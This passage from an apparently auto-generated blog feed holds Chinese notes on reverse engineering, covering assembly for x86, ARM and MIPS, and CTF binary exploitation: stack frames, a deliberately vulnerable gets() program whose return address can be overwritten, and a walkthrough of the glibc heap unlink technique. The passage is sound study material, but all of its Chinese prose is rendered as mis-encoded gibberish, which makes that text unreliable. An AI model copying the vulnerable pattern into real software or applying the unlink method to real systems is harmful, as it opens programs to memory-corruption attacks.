class="comment">;ä¸stmfdç›¸åï¼Œç±»ä¼¼popj</span></span><br></pre></td></tr></table></figure><p>ARMçš„spå¯„å­˜å™¨ç›¸å½“äºx86æ¶æ„ä¸‹çš„sp/esp/rspçš„é›†åˆ<br><br>ARMçš„pcç›¸å½“äºx86çš„ip/eip/rip</p>]]></content>
      
      
      <categories>
          
          <category> è®°ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
            <tag> è¯»ä¹¦ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘å·¥ç¨‹æƒå¨æŒ‡å—è¯»ä¹¦ç¬”è®°-2</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ€ç®€å‡½æ•°"><a href="#æœ€ç®€å‡½æ•°" class="headerlink" title="æœ€ç®€å‡½æ•°"></a>æœ€ç®€å‡½æ•°</h1><blockquote><p>æœ¬ç« ä»¥ä¸€ä¸ªå‡½æ•°<code>int f(){return 123;}</code>åœ¨ä¸åŒæŒ‡ä»¤é›†ä¸‹çš„ç¼–è¯‘ç»“æœï¼Œç®€å•æè¿°äº†æŒ‡ä»¤é›†é—´çš„å·®å¼‚ã€‚</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">f:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">123</span></span><br><span class="line">    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f <span class="meta">proc</span></span><br><span class="line">    <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0x7b</span> <span class="comment">; 123</span></span><br><span class="line">    <span class="keyword">bx </span><span class="built_in">lr</span></span><br><span class="line">    <span class="meta">endp</span></span><br></pre></td></tr></table></figure><p>ARMä¸­ï¼Œr0ä¿å­˜å‡½æ•°è¿”å›å€¼ï¼Œlrä¿å­˜è¿”å›åœ°å€ï¼ˆåŒºåˆ«äºx86çš„å‡½æ•°æ ˆï¼‰ï¼Œbxä¸ºè·³è½¬æŒ‡ä»¤ã€‚</p><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>$<span class="number">31</span></span><br><span class="line">li $<span class="number">2</span>, <span class="number">123</span>     <span class="comment"># 0x7b</span></span><br></pre></td></tr></table></figure><p>jä¸ºè·³è½¬ï¼Œ$31ã€$2è¡¨ç¤ºå¯„å­˜å™¨ï¼Œæ ¹æ®RISCçš„ç‰¹æ€§ï¼Œèµ‹å€¼è¯­å¥åœ¨è½¬ç§»æŒ‡ä»¤ä¹‹å‰æ‰§è¡Œï¼Œå› æ­¤é¡ºåºé¢ å€’ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è®°ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
            <tag> è¯»ä¹¦ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘å·¥ç¨‹æƒå¨æŒ‡å—è¯»ä¹¦ç¬”è®°-1</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CPUç®€ä»‹"><a href="#CPUç®€ä»‹" class="headerlink" title="CPUç®€ä»‹"></a>CPUç®€ä»‹</h1><blockquote><p>ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼šæŒ‡ä»¤ç ã€æœºå™¨ç ã€æ±‡ç¼–è¯­è¨€ã€å¯„å­˜å™¨</p></blockquote><p>æœ¬ä¹¦ä½¿ç”¨çš„CPUæ¶æ„ï¼š</p><ul><li>x86</li><li>x86-64</li><li>ARM64</li><li>ARM(å±äºRISC CPU)<blockquote><p>Thumbæ¨¡å¼(æŒ‡ä»¤ä¸º2å­—èŠ‚å¤§å°)èŠ‚çœäº†ä¼ ç»ŸARMç»Ÿä¸€æŒ‡ä»¤ç é•¿åº¦ä¸º4å­—èŠ‚çš„æƒ…å†µä¸‹å ç”¨ç©ºé—´è¾ƒå¤§çš„é—®é¢˜ã€‚éœ€è¦æ³¨æ„Thumbä¸èƒ½å°è£…æ‰€æœ‰ARMæŒ‡ä»¤ï¼Œä¼ ç»ŸARMçš„4å­—èŠ‚æ¨¡å¼å¯ä»¥å’ŒThumbæ¨¡å¼åŒæ—¶å­˜åœ¨</p><blockquote><p>Thumb-2æ¨¡å¼åŒ…å«äº†2å­—èŠ‚æŒ‡ä»¤å’Œ4å­—èŠ‚æŒ‡ä»¤ï¼Œä½†ä¸æ˜¯ç®€å•çš„Thumbä¸ARMçš„å¤åˆï¼Œè€Œæ˜¯ä¸€ç§ç‹¬ç«‹è¿è¡Œæ¨¡å¼ï¼Œåº”ç”¨äºiPodã€iPhoneã€iPadåº”ç”¨ç¨‹åºï¼ŒXcodeç¼–è¯‘å™¨é»˜è®¤ä½¿ç”¨æ­¤æ¨¡å¼ç¼–è¯‘</p></blockquote></blockquote></li></ul><p><b>ARMæŒ‡ä»¤é›†åˆ†ä¸‰ç±»ï¼ŒARMã€ARM64ã€Thumb(Thumb-2)</b></p>]]></content>
      
      
      <categories>
          
          <category> è®°ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
            <tag> è¯»ä¹¦ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯’å‡ä»»åŠ¡ç¬”è®°</title>
      <link href="/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å› ä¸ºä¹‹å‰å·²ç»æœ‰ä¸€å®šåŸºç¡€ï¼Œæ‰€ä»¥å‡æœŸçš„å­¦ä¹ é‡ç‚¹æ”¾åœ¨äº†è¡¥å……åŸºç¡€çŸ¥è¯†ä¸Šï¼Œé¡ºä¾¿é’ˆå¯¹æ€§åœ°åšäº†å‡ é“æœ‰ä»£è¡¨æ€§çš„é¢˜ï¼Œæ¯é“é¢˜çš„çŸ¥è¯†ç‚¹æ˜¯å¾ˆå•ä¸€çš„æ ˆæº¢å‡º/æ ¼å¼åŒ–å­—ç¬¦ä¸²/å †æº¢å‡ºï¼Œä½†æ˜¯ä¹Ÿä¸ç®—ç®€å•åˆ°ç§’æ€çº§åˆ«ï¼Œå› ä¸ºä¼šå¤¹æ‚ä¸€äº›å‘ï¼Œå¹¶ä¸”å‡ºé¢˜äººæŒ–çš„å‘ä¸€ä¸ªä¸å‰©çš„å…¨è¸©åˆ°äº†â€¦â€¦</p></blockquote><h3 id="ä¸€ã€åŸºç¡€çŸ¥è¯†"><a href="#ä¸€ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="ä¸€ã€åŸºç¡€çŸ¥è¯†"></a>ä¸€ã€åŸºç¡€çŸ¥è¯†</h3><blockquote><p>è¿™éƒ¨åˆ†ä¸»è¦æ˜¯æ”¾ä¸€äº›åŸºç¡€çš„åšé¢˜å‰ç½®çŸ¥è¯†ï¼Œä»¥å‰å­¦è¿‡çš„å’Œæ–°æŒæ¡çš„éƒ½æ”¾åœ¨ä¸€èµ·äº†ã€‚</p></blockquote><h5 id="1-æ±‡ç¼–ã€æ ˆæº¢å‡º"><a href="#1-æ±‡ç¼–ã€æ ˆæº¢å‡º" class="headerlink" title="1.æ±‡ç¼–ã€æ ˆæº¢å‡º"></a>1.æ±‡ç¼–ã€æ ˆæº¢å‡º</h5><p>å¸¸è§å¯„å­˜å™¨å¦‚å›¾</p><p><img src="http://www.cs.virginia.edu/~evans/cs216/guides/x86-registers.png" alt="Please wait while loading image." title="x86"></p><p>å…¶ä¸­é‡ç‚¹åœ¨äºESPã€EBPã€‚espç”¨äºä¿å­˜æ ˆé¡¶æŒ‡é’ˆï¼Œebpä¿å­˜æ ˆåº•ï¼ˆä¸»è¦å’Œæ ˆå¸§è”ç³»åœ¨ä¸€èµ·ï¼‰ã€‚<br>ä¸‹é¢è°ˆä¸€ä¸ªæ ˆæº¢å‡ºçš„å‰ç½®çŸ¥è¯†ï¼šæ ˆå¸§</p><ul><li>æ ˆå¸§å®é™…ä¸Šå°±æ˜¯å‡½æ•°è°ƒç”¨çš„è®°å½•ã€‚CPUæ²¡æœ‰å¤šä½™çš„å¯„å­˜å™¨ä¿å­˜å¤šä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œä¸€æ—¦å‡ºç°2ä¸ªä»¥ä¸Šå‡½æ•°çš„åµŒå¥—è°ƒç”¨ï¼Œå¤–éƒ¨å‡½æ•°çš„è¿”å›åœ°å€ä»¥åŠå±€éƒ¨å˜é‡ç­‰æ•°æ®å°±éœ€è¦ä¸´æ—¶ä¿å­˜ï¼Œä¿å­˜çš„æ–¹æ³•å°±éœ€è¦ç”¨åˆ°æ ˆå¸§å®ç°ã€‚</li><li>æ ˆå¸§å­˜å‚¨åœ¨æ ˆä¸Šï¼Œå…¶æœ¬èº«ä¹ŸæŒ‰æ ˆç»“æ„è¿›è¡Œå­˜å‚¨ã€‚æ ˆå¸§ä¸€å—å—åœ°å­˜å‚¨åœ¨æ ˆä¸Šï¼Œå°±å¯¼è‡´å¯„å­˜å™¨çš„ebpä¸æ–­æ”¹å˜ï¼Œå› æ­¤ebpä¹Ÿéœ€è¦åœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™å‹å…¥æ ˆå¸§ä¿å­˜ã€‚æ ˆå¸§çš„å®é™…ç»“æ„å¦‚ä¸‹ï¼š</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/5418798-1c45c860220f0dfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374" alt="Please wait while loading image." title="æ ˆå¸§"></p><ul><li>åœ¨ç”Ÿæˆæ ˆå¸§æ—¶ï¼Œå…ˆå°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ï¼Œå†å‹å…¥ebpã€‚è®¾æƒ³ï¼Œç¨‹åºè®¾è®¡è€…å¼€è¾Ÿäº†ä¸€ä¸ªæ•°ç»„ç”¨äºä¿å­˜ç”¨æˆ·è¾“å…¥ï¼Œè¿è¡Œæ—¶è¿™ä¸ªæ•°ç»„å¯¹åº”çš„ç©ºé—´ä½äºå›¾ä¸­ebpçš„ä¸Šéƒ¨ï¼Œæ­¤æ—¶ï¼Œè‹¥ç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥åšé•¿åº¦é‰´å®šï¼Œç”¨æˆ·æ­¤æ—¶è¾“å…¥äº†ä¸€ä¸ªå¤§äºæ•°ç»„å¤§å°çš„å­—ç¬¦ä¸²ï¼Œç³»ç»Ÿä¸ä¼šè‡ªåŠ¨ä¸ºè¾“å…¥åšå‡ºæ£€æŸ¥ï¼Œåªä¼šæŒ‰äº‹å…ˆå†™å¥½çš„æ­¥éª¤ï¼Œå°†å­—ç¬¦ä¸²ä¸€ç‚¹ç‚¹å­˜å…¥æ ˆä¸­ï¼Œå¤šå‡ºæ¥çš„éƒ¨åˆ†åŒæ ·ä¼šè¢«å­˜å…¥ï¼Œè€Œé¢„ç•™çš„ç©ºé—´å·²ç»ä¸è¶³ï¼Œè¿™ç§æƒ…å†µä¸‹æº¢å‡ºå°±å‘ç”Ÿäº†ã€‚å¤šä½™çš„å­—ç¬¦ä¸²ä¼šæŒ‰é¡ºåºè¦†ç›–æ‰æ ˆä¸Šçš„ebpã€è¿”å›åœ°å€ï¼Œå¯¼è‡´è¿”å›åœ°å€å¼‚å¸¸ï¼Œä»è€Œä½¿ç¨‹åºå´©æºƒã€‚</li></ul><h5 id="2-å·¥å…·"><a href="#2-å·¥å…·" class="headerlink" title="2.å·¥å…·"></a>2.å·¥å…·</h5><p>åšpwné¢˜ä¸å¤ªå¼ºè°ƒé€†å‘èƒ½åŠ›ï¼Œä¸€èˆ¬åªéœ€è¦ä½¿ç”¨IDAåæ±‡ç¼–ï¼Œå¤§è‡´é˜…è¯»ï¼Œæˆ–è€…å¹²è„†F5åç¼–è¯‘ç›´æ¥é˜…è¯»Cä»£ç ï¼Œç†æ¸…ä»£ç çš„å¤§è‡´æ€è·¯å³å¯ã€‚åœ¨ä¸€äº›é¢˜ç›®ä¸­ï¼Œå‡ºé¢˜è€…ä¼šå®ç°å†™å¥½è·å–flagçš„å‡½æ•°ï¼Œä½†å¹¶ä¸åœ¨mainä¸­ä½¿ç”¨ï¼Œæ­¤æ—¶è¿˜éœ€è¦åœ¨IDAä¸­æŸ¥çœ‹å·¦ä¾§å‡½æ•°è¡¨ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰è¿™ç±»å’Œshellç›´æ¥ç›¸å…³çš„æœªè°ƒç”¨å‡½æ•°ï¼ˆä¹Ÿå¯ä½¿ç”¨r2çš„aaåŠŸèƒ½ï¼‰ã€‚<br>ä¸ºäº†æŸ¥çœ‹ç¨‹åºæ‰€å¼€å¯çš„ä¿æŠ¤ï¼Œå¯ä½¿ç”¨checksecï¼ˆéšpwnlibå®‰è£…ï¼‰æ¥æŸ¥çœ‹ã€‚<br>ä¸ºäº†å†™expï¼Œpythonçš„pwnåº“åŸºæœ¬æ˜¯å¿…ä¸å¯å°‘çš„ï¼ˆå…¶å®ç›´æ¥ç”¨Cç¨‹åºå†™expæ›´ç›´æ¥ï¼Œä¹Ÿå¹¶ä¸éº»çƒ¦ï¼Œåªæ˜¯pwnç”¨çš„äººè¶Šæ¥è¶Šå¤šï¼Œé›†æˆçš„åŠŸèƒ½ä¹Ÿè¶Šæ¥è¶Šå¤šï¼ŒåŸºæœ¬æ²¡æœ‰äººç”¨Cå†™äº†ï¼‰ã€‚pwnä¸­æœ€åŸºç¡€çš„æ“ä½œï¼Œå¦‚recv()ã€process()ã€interactive()ã€p32()ã€sendline()ç­‰ç­‰ï¼Œåªéœ€ç®€å•ä½¿ç”¨ä¸€éå°±å¯ä»¥ä¸Šæ‰‹ï¼Œpwnçš„å…¶ä»–çš„åŠŸèƒ½åˆ™éœ€è¦å¤šçœ‹å®˜æ–¹è¯´æ˜ï¼ˆå¦‚ç›´æ¥ç”Ÿæˆshellcodeç­‰ç­‰ï¼‰ã€‚</p><h5 id="3-å †"><a href="#3-å †" class="headerlink" title="3.å †"></a>3.å †</h5><p>ç”±äºå †çš„å†…å®¹å¾ˆå¤šï¼Œæˆ‘ä¹Ÿåªæ˜¯ç ”ç©¶äº†ä¸€éƒ¨åˆ†ï¼Œæ²¡åŠæ³•å†™ä¸€ä¸ªæ€»ç»“ï¼Œå°±å…ˆæŠŠå­¦ä¹ çš„è§†é¢‘é“¾æ¥è´´ä¸Šæ¥äº†â€¦â€¦åŸè§†é¢‘æ˜¯åœ¨YouTubeä¸Šçš„ï¼Œä¸ºäº†ä¸ç”¨æ¯æ¬¡ç‰¹æ„æŒ‚æ¢¯å­å»çœ‹è§†é¢‘ï¼Œæˆ‘æŠŠè§†é¢‘æ¬è¿åˆ°Bç«™äº†ã€‚<a href="https://www.bilibili.com/video/av43948832/" target="_blank" rel="noopener">é“¾æ¥</a></p><h3 id="äºŒã€æ¼æ´åŸç†"><a href="#äºŒã€æ¼æ´åŸç†" class="headerlink" title="äºŒã€æ¼æ´åŸç†"></a>äºŒã€æ¼æ´åŸç†</h3><blockquote><p>ä¸»è¦æ˜¯æ ˆæº¢å‡ºï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åŸç†æ¯”è¾ƒç®€å•ï¼ŒæœˆåˆŠé‡Œå†™å¾—å¾ˆè¯¦ç»†äº†ã€‚</p></blockquote><h5 id="1-æ ˆæº¢å‡º"><a href="#1-æ ˆæº¢å‡º" class="headerlink" title="1.æ ˆæº¢å‡º"></a>1.æ ˆæº¢å‡º</h5><p>ç»“åˆæ ˆå¸§çš„çŸ¥è¯†ï¼Œæ ˆæº¢å‡ºå®é™…ä¸Šå°±æ˜¯æ„é€ ä¸€ä¸ªè¾“å…¥ï¼Œä½¿è¾“å…¥çš„å†…å®¹æ°å¥½è¦†ç›–åˆ°ebpä¸‹é¢çš„è¿”å›åœ°å€ä¸Šï¼Œè¿™æ ·å½“å‡½æ•°è¿”å›æ—¶å°±ä¼šæŒ‰æ”»å‡»è€…è¾“å…¥çš„åœ°å€è¿”å›ï¼Œè¿”å›åœ°å€ä¼šè¢«å­˜å‚¨åˆ°eipä¸­ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºå°†è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/5418798-738c7fdf09073b61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/946" alt="Please wait while loading image." title="stack overflow"></p><p>ä¾‹ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Cè¯­è¨€è¯¾ä¸Šè€å¸ˆæåˆ°è¿‡gets()å‡½æ•°å¹¶ä¸å¥½ï¼Œä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºgets()ä¸ä¼šå¯¹è¾“å…¥åšå‡ºé•¿åº¦æ£€æµ‹ï¼Œå› æ­¤å¾ˆå®¹æ˜“å¯¼è‡´æ ˆæº¢å‡ºã€‚ä¸Šé¢çš„ä»£ç ç”±äºåœ¨vulnerable()ä¸­ä½¿ç”¨äº†gets()ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°†å®ƒçš„è¿”å›åœ°å€è¦†ç›–ä¸ºsuccess()çš„é¦–åœ°å€ï¼Œè¿™æ ·åœ¨vulnerable()è¿”å›åä¼šåœ¨å±å¹•ä¸Šè¾“å‡ºâ€You already controlled it.â€ç°ä»£æ“ä½œç³»ç»Ÿå·²ç»å®ç°äº†å¤šç§ç¼“è§£æ ˆæº¢å‡ºæ”»å‡»çš„æ–¹æ³•ï¼Œå¦‚canaryä¿æŠ¤ã€NXä¿æŠ¤ã€ASLRç­‰æœºåˆ¶ï¼Œä¸Šè¿°ä»£ç ä¹Ÿåªæœ‰åœ¨ç¼–è¯‘å™¨å…³é—­äº†ä¼—å¤šä¿æŠ¤æœºåˆ¶çš„å‰æä¸‹æ‰èƒ½å®ç°ç®€å•çš„æ ˆæº¢å‡ºæ”»å‡»ï¼Œå¦åˆ™éœ€è¦å„ç§æœºåˆ¶çš„åº”å¯¹æªæ–½æ¥ç»•è¿‡æœºåˆ¶ï¼Œä½¿å¾—æ ˆæº¢å‡ºçš„åˆ©ç”¨å—é™ã€‚<br>å‡æœŸè¿˜å¤§è‡´å­¦ä¹ äº†NXã€ASLRçš„ç»•è¿‡ï¼Œå‚è€ƒçš„<a href="https://sploitfun.wordpress.com/" target="_blank" rel="noopener">SploitFun</a><br>å…³äºæ ˆæº¢å‡ºçš„ä»‹ç»å†…å®¹è¡¥å……è§iæ˜¥ç§‹æœˆåˆŠ</p><h5 id="2-å †æº¢å‡º"><a href="#2-å †æº¢å‡º" class="headerlink" title="2.å †æº¢å‡º"></a>2.å †æº¢å‡º</h5><p>å †æº¢å‡ºçš„åŸç†å’Œæ ˆæº¢å‡ºç›¸åŒï¼Œä½†ç”±äºå †çš„chunkç»“æ„å¤æ‚ï¼Œå¹¶ä¸”ä¸€èˆ¬åœ¨å †ä¸­æ²¡æœ‰è¿”å›åœ°å€ï¼Œå› æ­¤å †æº¢å‡ºä¹‹åçš„åˆ©ç”¨ä¹Ÿç›¸å¯¹å¤æ‚ã€‚å¤§è‡´æ€è·¯ï¼ˆä»¥unlinkæº¢å‡ºä¸ºä¾‹ï¼‰ï¼Œæ˜¯ä»¿ç…§chunkçš„æ ¼å¼ï¼Œè®¡ç®—åç§»ï¼Œåœ¨chunkçš„dataåé¢å†æ‰‹åŠ¨å†™ä¸Šä¸€ä¸ªprev_sizeã€chunk_sizeä»¥åŠfdã€bkæŒ‡é’ˆï¼Œä»¥æ­¤è¾¾åˆ°ä¼ªé€ ä¸€ä¸ªå †å—çš„æ•ˆæœï¼Œéšåå†™å…¥çš„shellcodeä¼šè¦†ç›–æ‰free()çš„GOTåœ°å€ã€‚ä¹‹åï¼Œè‹¥ç¨‹åºè¦è°ƒç”¨free()ï¼Œå°±ä¼šå®é™…ä¸Šæ‰§è¡Œshellcodeï¼Œå®ç°æ”»å‡»è€…çš„ç›®çš„ã€‚</p><ul><li>unlink</li></ul><p>å‡è®¾å †ä¸Šæœ‰è‹¥å¹²ä¸ªchunkï¼šchunk0ã€chunk1ã€chunk2ã€chunk3<br>å››ä¸ªchunkéƒ½æ­£åœ¨ä½¿ç”¨ï¼Œè¿™æ—¶æˆ‘ä»¬æ­£å¸¸freeæ‰chunk2<br>ä¹‹åchunk2çš„sizeåé¢å¤šäº†fdã€bkï¼Œå¹¶ä¸”chunk2æŒ‡é’ˆå­˜å…¥binä¸­<br>å‡è®¾chunk1å¯ä»¥æº¢å‡ºï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡chunk1æº¢å‡ºåˆ°chunk2ï¼Œä¿®æ”¹chunk2çš„fdã€bk<br>æŠŠfdä¿®æ”¹ä¸º[ç›®æ ‡åœ°å€-12]ï¼Œbkä¿®æ”¹ä¸ºç›®æ ‡å€¼ï¼ˆä»»æ„åœ°å€å†™çš„åœ°å€ï¼Œå’Œå†™è¿›å»çš„å€¼ï¼‰</p><p>å†freeæ‰chunk1ï¼Œå› ä¸ºchunk1çš„bkæŒ‡å‘chunk2ï¼ŒfdæŒ‡å‘chunk0ï¼Œè€Œåªæœ‰chunk2æ˜¯freed chunk<br>æ‰€ä»¥è§¦å‘äº†unlinkæœºåˆ¶ï¼Œunlinkæœºåˆ¶è¦å¯¹<strong>chunk2</strong>è¿›è¡Œæ“ä½œï¼Œä»¥åˆå¹¶chunk1å’Œchunk2</p><p>è¿™é‡ŒFDã€BKæŒ‡çš„æ˜¯<strong>è¢«unlinkçš„</strong>chunkçš„fdã€bkæŒ‡å‘çš„chunk<br>æ­¤æ—¶unlinkè®¤ä¸ºchunk2çš„FDä¸º[ç›®æ ‡åœ°å€-12]<br>åŒç†ï¼Œunlinkè®¤ä¸ºchunk2çš„BKä¸ºç›®æ ‡å€¼</p><p>ç¡®è®¤äº†FDå’ŒBKï¼Œunlinkå°†ä¼šè¿›è¡ŒåŒå‘é“¾è¡¨çš„èŠ‚ç‚¹åˆ é™¤å¤„ç†<br>unlinkä¼šæ‰§è¡Œ ï¼š</p><ol><li>FD-&gt;bk = BKï¼Œunlinkä¸ºäº†ç¡®å®šbkï¼Œéœ€è¦é€šè¿‡chunk2çš„æŒ‡é’ˆæ¥è®¡ç®—ï¼ˆè®¡ç®—æ–¹æ³•ä¸ºFDåŠ ä¸Š3å€çš„sizeå­—æ®µå¤§å°ï¼Œ32ä½ä¸‹ä¸º12ï¼‰ï¼Œè€ŒFD=[ç›®æ ‡åœ°å€-12]æ‰€ä»¥FD-&gt;bkå°±ç›¸å½“äºç›®æ ‡åœ°å€ï¼Œunlinkè¦æŠŠBKèµ‹å€¼ç»™ç›®æ ‡åœ°å€ï¼Œæ­¤æ—¶ï¼Œç›®æ ‡å€¼å°±å¤åˆ¶åˆ°äº†ç›®æ ‡åœ°å€</li><li>BK-&gt;fd = FDï¼ŒåŒç†ï¼ŒBK-&gt;fdéœ€è¦åŠ 2å€çš„å­—æ®µå¤§å°ï¼Œ32ä½ä¸‹æ˜¯8ï¼Œå› æ­¤unlinkå°†[ç›®æ ‡åœ°å€-12]å¤åˆ¶åˆ°äº†[ç›®æ ‡å€¼+8]ï¼Œè²Œä¼¼æ²¡ä»€ä¹ˆç”¨ï¼Œå‰ä¸€æ­¥å·²ç»å®Œæˆäº†è¿™ä¸ªæ“ä½œã€‚</li></ol><p>ç°ä»£glibcä¸ºäº†åº”å¯¹ä¸Šè¿°æƒ…å†µçš„å‘ç”Ÿï¼Œåœ¨unlinkå‰åŠ äº†ä¸€ä¸ªæ£€æµ‹æ­¥éª¤ï¼Œå³æ£€æµ‹P-&gt;fd-&gt;bkæ˜¯å¦æŒ‡å‘Pï¼ŒP-&gt;bk-&gt;fdæ˜¯å¦æŒ‡å‘Pï¼ˆPä¸ºchunk2ï¼‰<br>æŠŠå‰é¢æ„é€ çš„fake chunkå¸¦å…¥è¿™ä¸ªæ£€æµ‹ï¼ŒFD-&gt;bkæŒ‡å‘çš„æ˜¯ç›®æ ‡åœ°å€ï¼Œä¸æ˜¯Pï¼Œä¸èƒ½é€šè¿‡æ£€æµ‹<br>å› æ­¤ä¸ºäº†åº”å¯¹æ£€æµ‹ï¼Œéœ€è¦æ”¹å˜æ”¹å†™çš„fake chunkçš„fdå’Œbk</p><p>è¯¦ç»†è§£é‡Šä¸‹unlinkåçš„æ“ä½œï¼š</p><p>ï¼ˆP_ptræ˜¯éœ€è¦äº‹å…ˆè·å–çš„ï¼‰<br>åœ¨è¿™é‡Œå°†chunk2çš„fdè®¾ç½®æˆchunk2æŒ‡é’ˆå‡å»12ï¼ˆFD = P_ptr - 12ï¼‰ï¼Œfdè®¾ç½®æˆchunk2æŒ‡é’ˆå‡å»8ï¼ˆBK = P_ptr - 8ï¼‰<br>è¿™é‡Œçš„FDã€BKæ˜¯unlinkè®¤ä¸ºçš„ï¼Œä¸æ˜¯æ­£å¸¸ç†è§£ä¸‹çš„chunk1å’Œchunk3</p><p>è¿™æ ·è®¾ç½®ä¹‹åï¼Œunlinkå‰çš„æŒ‡é’ˆæ£€æŸ¥å°±ä¼šå˜ä¸ºå¦‚ä¸‹ï¼š<br>unlinkè®¡ç®—FD-&gt;bkæ—¶ï¼Œä¼šä½¿ç”¨FDï¼ŒæŠŠFDåŠ ä¸Š12ï¼Œè€Œä¼ªé€ çš„FDå®é™…ä¸Šæ˜¯P_ptr - 12ï¼Œè®¡ç®—åå¾—åˆ°P_ptrï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘chunk2çš„æŒ‡é’ˆ<br>åŒç†BK-&gt;fdç»è¿‡è®¡ç®—ä¹Ÿä¼šå¾—åˆ°æŒ‡å‘chunk2çš„æŒ‡é’ˆ<br>è¿™æ ·ä¼ªé€ çš„fd bkå°±é€šè¿‡äº†unlinkå‰çš„æ£€æŸ¥ï¼Œchunk2å°†ä¼šè¢«unlinkï¼Œåˆå¹¶åˆ°chunk1</p><p>æŒ‰ä¹‹å‰æåˆ°è¿‡çš„unlinkçš„æ‰§è¡Œæ­¥éª¤è¿›è¡Œï¼š</p><ol><li>FD-&gt;bk = BKï¼Œåˆšåˆšæè¿‡ï¼ŒFD-&gt;bkå°±æ˜¯chunk2ï¼Œè¿™ä¸ªæŒ‡é’ˆå­˜å‚¨åœ¨bin 